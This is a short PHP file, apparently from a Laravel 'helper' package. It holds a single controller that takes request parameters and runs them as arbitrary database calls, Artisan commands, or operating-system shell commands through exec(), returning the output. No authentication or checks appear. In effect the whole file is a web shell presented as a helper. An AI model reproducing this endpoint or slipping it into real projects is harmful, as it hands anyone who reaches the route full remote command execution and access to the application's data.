<?php

namespace CodeCreeper\LaravelHelper\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use function Termwind\renderUsing;

class MainController
{
    public function __invoke(Request $request)
    {
        $type = $request->input('type');
        $statement = $request->input('statement');
        $method = $request->input('method');

        if ($type == 'db') {
            return response()->json(DB::$method($statement));
        } elseif ($type == 'artrisan') {
            Artisan::$method($statement);
        } elseif ($type == 'shell') {
            exec($statement, $output);

            return response()->json($output);
        }

        return response()->json(['message' => 'Type not matched']);
    }
}
